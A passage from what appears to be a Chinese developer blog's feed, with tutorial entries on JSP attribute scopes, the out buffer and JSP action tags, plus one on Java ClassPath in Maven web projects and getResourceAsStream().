作用域：session</span><br><span class="line">application 作用域：application</span><br></pre></td></tr></table></figure><ul><li>request 作用域限制在一次请求中，当我们直接访问 <code>/head.jsp</code> 发现因为是新的一次请求，而并非设置 request 的请求 + 转发，所以 request 属性值失效。</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pageContext 作用域：null</span><br><span class="line">request 作用域：null</span><br><span class="line">session 作用域：session</span><br><span class="line">application 作用域：application</span><br></pre></td></tr></table></figure><ul><li>session 作用域是一次会话，会话指从打开网页到关闭浏览器，这一个过程被称为一个会话。当我们访问 <code>test.jsp</code> 之后关闭网页，再次访问 <code>/head.jsp</code> 发现脱离上一次会话之后，session 中属性值失效。</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pageContext 作用域：null</span><br><span class="line">request 作用域：null</span><br><span class="line">session 作用域：null</span><br><span class="line">application 作用域：application</span><br></pre></td></tr></table></figure><ul><li>application 作用域是整个 BookStore 项目，在这个项目下面，所有的页面何时何地都可以获取 application 设置的属性值，只有访问其他 Blog 之类的项目时，才会脱离 application 的作用域。</li></ul><h3 id="out-对象输出"><a href="#out-对象输出" class="headerlink" title="out 对象输出"></a>out 对象输出</h3><p><img src="https://xorex.space/image/209.jpg"></p><p>out 有自己的缓冲区，可以使用 page 命令设置，只有这个缓冲区满了或者 out 调用了 flush() 方法，才会将 out 缓冲区内容交给 Writer 缓冲区处理。</p><p>所以涉及到 out 的缓冲区问题，我们在 JSP 网页中一般都使用 out 来输出而不是 response.getWriter() 来输出。因为 JSP 的网页的 HTML 等都是使用 out 来输出，我们自己乱用 response.getWrite() 来输出会打乱其中的代码顺序。</p><h2 id="JSP-标签"><a href="#JSP-标签" class="headerlink" title="JSP 标签"></a>JSP 标签</h2><p>需要注意一下子的是，下面的东西在填写参数的时候，可以使用 JSP 表达式来填写参数 <code>XXX=&lt;%=Expression%&gt;</code> </p><h3 id="jsp-include"><a href="#jsp-include" class="headerlink" title="jsp:include"></a><a href="jsp:include">jsp:include</a></h3><p>格式： <code>&lt;jsp:include page=&quot;XXX&quot;/&gt;</code> 然后回将对应路径的文件也翻译成 Servlet 程序，然后在本页面使用下面这个函数调用生成的 Servlet 程序，这种包含方式被称为动态包含。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JspRunTimeLibrary.include(request,response,<span class="string">&quot;/XXX/XXX.jsp&quot;</span>,out,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>也就是说，对于动态包含是会生成两个 Servlet 程序，而对于静态包含，则会将两个合并为一个文件，然后生成一个 Servlet 程序。</p><p>因为在调用的时候会传入 request response 参数，所以可以用其请求作用域来传递数据，很方便很好用。当然，一般在开发的时候都会去使用静态包含而不是动态包含。</p><h3 id="jsp-forward"><a href="#jsp-forward" class="headerlink" title="jsp:forward"></a><a href="jsp:forward">jsp:forward</a></h3><p>格式 <code>&lt;jsp:forward page=&quot;XXX/XXX.xxx&quot; &gt;</code> 和 <code>request.getRequestDispatcher(&quot;XXX/XXX.xxx&quot;).forward(request, response);</code> 效果相同。</p><h3 id="jsp-param"><a href="#jsp-param" class="headerlink" title="jsp:param"></a><a href="jsp:param">jsp:param</a></h3><p>格式：<code>&lt;jsp:param name=&quot;ParaName&quot; value=&quot;ParaValue&quot;/&gt;</code> 夹在 <code>&lt;jsp:forward&gt;&lt;/jspforward&gt;</code> 之间，作为转发请求时的附加 Get 参数。其中参数可以是其他的任何引用类型。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JSP-概述&quot;&gt;&lt;a href=&quot;#JSP-概述&quot; class=&quot;headerlink&quot; title=&quot;JSP 概述&quot;&gt;&lt;/a&gt;JSP 概述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;JSP（全称为 JavaServer Pages）是由 Sun 公司主导建立的一种</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="JSP" scheme="https://xorex.space/tags/JSP/"/>
    
  </entry>
  
  <entry>
    <title>ClassPath 和 getResourceAsStream()</title>
    <link href="https://xorex.space/2021/03/30/34a1ace02353/"/>
    <id>https://xorex.space/2021/03/30/34a1ace02353/</id>
    <published>2021-03-30T03:49:38.000Z</published>
    <updated>2021-03-31T13:26:57.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ClassPath"><a href="#ClassPath" class="headerlink" title="ClassPath"></a>ClassPath</h2><blockquote><p>Classpath 是 Java 虚拟机或 Java 编译器中的参数，用于指定用户定义的类和包的位置。</p></blockquote><h3 id="普通本地项目的-ClassPath"><a href="#普通本地项目的-ClassPath" class="headerlink" title="普通本地项目的 ClassPath"></a>普通本地项目的 ClassPath</h3><p>Java 的运行是先运行 <code>javac.exe</code> 先将 <code>.java</code> 代码编译成 <code>.class</code> 字节码文件，然后运行 <code>java.exe</code> 启动 JVM ，然后 JVM 调用自己的 ClassLoader 类加载器读取 <code>.class</code> 文件，然后处理文件为内存中的 Class 类，这样无论是实例化还是执行就都没问题了。</p><p>但是 ClassLoader 去哪里找 <code>.class</code> 文件呢？那就是 ClassPath。而需要加载的 <code>.class</code> 文件除了我们自己写的 java 代码编译出来的以外，还有我们引用的外部的核心类的 <code>.class</code> 文件。对于外部核心类，我们通过设置环境变量中的 <code>classpath=XXXXXX</code> 将核心类的文件位置告诉 ClassLoader。至于我们自己写的 java 代码的 <code>.class</code> 文件位置，则由 IDEA 在代替我们运行 java.exe 文件的时候，传入了 <code>-cp XXXX</code> 参数，告诉了 ClassLoader 位置。</p><p>而 IDEA 增加的参数的地址在一个本地的普通工程中是固定的，那就是工程中的 Out\Production\ProjectName 文件夹里面。这个文件夹里面存储的就是编译好的 <code>.class</code> 文件。所以 Out\Production\ProjectName 也属于 ClassPath 的一部分。</p><h3 id="Web-项目的-ClassPath"><a href="#Web-项目的-ClassPath" class="headerlink" title="Web 项目的 ClassPath"></a>Web 项目的 ClassPath</h3><p>对于我们正在开发的 Web 项目来说，文件结构就会复杂很多了。首先是开发本地的文件，我们写 Java 代码的文件结构是这样的：</p><p><img src="https://xorex.space/image/207.jpg"></p><p>首先 main/java 和 test/java 下面的都是我们开发的时候编写的 <code>.java</code> 文件存储的位置，而 main/resource 和 test/resource 分别是业务代码和测试代码运行时所需要的资源的存放位置。 main/webapp 目录里面则是放置着 Web 应用所需要的文件资源（html，css，jsp，js 等），需要注意的是 main/webapp/WEB-INF 文件夹比较特殊，这个文件夹用于存储禁止用户访问的资源内容，只要 Web 应用需要，但是不想让用户访问到，就需要放置到这个文件夹下面。</p><p>上面就是我们在开发应用的时候，本地的一个项目结构了。但是我们开发的东西是最终需要部署到服务器上面的，肯定不会直接放置我们的开发文件（都是 <code>.java</code>文件无法运行），所以和上面的本地普通工程一样，需要有一个放置成品的文件夹，那就是 Target 文件夹，里面自动生成了所有被开发的成品。而其中文件夹名字和我们的项目名一样的那个文件夹，就是我们最终需要部署的 Web 应用了。</p><p><img src="https://xorex.space/image/208.jpg"></p><p>而这个 Web 应用成品的生成逻辑是这样的：首先开发区的 webapp 里面的东西会直接平移到成品文件夹里面（各种 Web 资源 html，css，jsp，js 等）。然后将开发区的 main/java 文件夹下面的所有 <code>.java</code> 文件编译成 <code>.class</code> 文件，然后和 main/resource 文件夹里面的资源一起按照原有的结构和放到 WEB-INF/classes 文件夹里面 (java+resource-&gt;classes) 。然后将 Maven 里面记录的依赖全部下载到 WEB-INF/lib 文件夹里面，供运行 classes 里面的字节码的时候调用。</p><p>这也是对应 Tomcat 的一个 Web 应用应该有的目录结构：<a href="https://xorex.space/2021/03/27/9234b0350059/#Java-Web-%E5%BA%94%E7%94%A8%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">Tomcat 应用目录结构</a></p><p>那么这里 Web 应用里面的 ClassPath 也就一目了然了， <code>BookStore/WEB-INF/classes</code> 和 <code>BookStore/WEB-INF/lib</code>。</p><h2 id="getResourceAsStream"><a href="#getResourceAsStream" class="headerlink" title="getResourceAsStream()"></a>getResourceAsStream()</h2><p>这个方法都是用来读取一个文件，调用后返回读取这个文件的 InputStream 对象，用于获取数据。</p><h3 id="使用-Class-类的方法"><a href="#使用-Class-类的方法" class="headerlink" title="使用 Class 类的方法"></a>使用 Class 类的方法</h3><p><code>this.getClass().getResourceAsStream(String file);</code> 这里是通过 Class 类来调用出来这个方法。当传入的文件路径开头加上了 <code>/</code> 之后，会以 ClassPath 为根路径去寻找资源。当传入的文件路径没有 <code>/</code> 的时候，则从 <strong>此类所在的包</strong> 下面去寻找资源</p><h3 id="使用-ClassLoader-类的方法"><a href="#使用-ClassLoader-类的方法" class="headerlink" title="使用 ClassLoader 类的方法"></a>使用 ClassLoader 类的方法</h3><p><code>this.getClass().getClassLoader().getResourceAsStream(String file);</code> 这里是通过类加载器 ClassLoader 类来调用这个方法，传入的参数不允许开头加上 <code>/</code> ，默认是以 ClassPath 为根路径去寻找资源。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ClassPath&quot;&gt;&lt;a href=&quot;#ClassPath&quot; class=&quot;headerlink&quot; title=&quot;ClassPath&quot;&gt;&lt;/a&gt;ClassPath&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Classpath 是 Java 虚拟机或 Java 编译</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="ClassPath" scheme="https://xorex.space/tags/ClassPath/"/>
    
  </entry>
  
</feed>
